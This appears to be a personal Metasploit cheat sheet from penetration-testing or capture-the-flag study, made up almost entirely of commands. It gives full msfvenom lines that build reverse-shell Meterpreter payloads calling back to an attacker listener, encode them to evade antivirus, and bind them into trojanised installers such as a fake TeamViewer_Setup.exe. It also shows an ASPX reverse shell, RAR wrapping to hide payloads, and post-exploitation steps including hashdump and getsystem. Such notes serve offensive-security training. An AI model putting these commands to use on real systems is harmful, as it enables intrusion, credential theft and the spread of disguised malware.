# **Metasploit**

--------------------------------------------------------------------

## Workspaces

```
service postgresql start
db_status

workspace -a name
workspace -d name
workspace -h (help)

sessions
sessions -k
run autoroute -s 0.0.0.0

analyze
vulns

sudo mv db_autopwn /usr/share/metasploit-framework/plugins
load db_autopwn
db_autopwn -p -t
db_autopwn -p -t -PI 445
```

--------------------------------------------------------------------

## WMAP

```
load wmap
wmap_sites -a 0.0.0.0
wmap_targets -t http://0.0.0.0
wmap_run -t (show modules)
wmap_run -e (run)
wmap_vulns

if GET…. allowed 
> scanner/http/http_put
> change path to /data/
```

--------------------------------------------------------------------

## Msfvenom

> Payloads

```
msfvenom —list payloads

> WINDOWS:

both versions:
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 -f exe > /home/kali/Desktop/Windows_payloads/payloadx86.exe

just 64 bits:
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 -f exe > /home/kali/Desktop/Windows_payloads/payloadx64.exe

msfvenom —list formats


> LINUX:

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 -f elf > /Desktop/Linux_Payloads/payloadx86
same as x64


> multi-handler

use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost,lport
```

```
sudo python -m SimpleHTTPServer 80 (Create simple server)
```

> Encoders

```
$ msfvenom —list encoders

$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 **-e x86/shikata_ga_nai** -f exe > /home/kali/Desktop/Windows_payloads/payloadx86.exe
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 **-i 10** -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/Windows_payloads/payloadx86.exe

**same for linux**

$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 **-i 10** -e x86/shikata_ga_nai -f exe **-k** **-x /Downloads/wrar602.exe** > /home/kali/Desktop/Windows_payloads/payloadx86.exe 
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 **-i 10** -e x86/shikata_ga_nai -f exe **-x /Downloads/wrar602.exe** > /home/kali/Desktop/Windows_payloads/payloadx86.exe 

$ run post/windows/manage/migrate


$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

$ use multi/handler


$ post/multi/recon/local_exploit_suggester   

$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

### Rar encoding
```shell-session
$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
$ rar a ~/test.rar -p ~/test.js
```
```shell-session
mv test.rar test
```
```shell-session
rar a test2.rar -p test
```
```shell-session
mv test2.rar test2
```


> Resource scripts

```
/usr/share/metasploit-framework/resource/

msfconsole -r handler.rc

resource /Desktop/handler.rc
```

--------------------------------------------------------------------

## Meterpreter

```
sysinfo
getsystem
getprivs
getuid
hashdump
show_mount
help
background (go back)
ls
cd
cat
edit flag1
download flag.zip
checksum md5 /bin/bash
getenv PATH
getenv TERM
search -d /usr/bin -f *backdoor*
search -f *.jpg
migrate 2212 (change to x64 or …)
execute -f ifconfig

ctrl-z
post/multi/shell_to_meterpreter

session -u 1
```

--------------------------------------------------------------------